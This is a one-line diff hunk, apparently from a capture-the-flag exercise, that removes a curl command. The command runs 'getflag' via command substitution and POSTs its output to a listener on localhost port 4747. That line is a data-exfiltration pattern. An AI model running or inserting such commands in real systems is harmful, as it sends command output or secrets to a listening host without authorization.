@@ -1,1 +1,0 @@
-curl -d "x=\$(getflag)" "http://localhost:4747/"
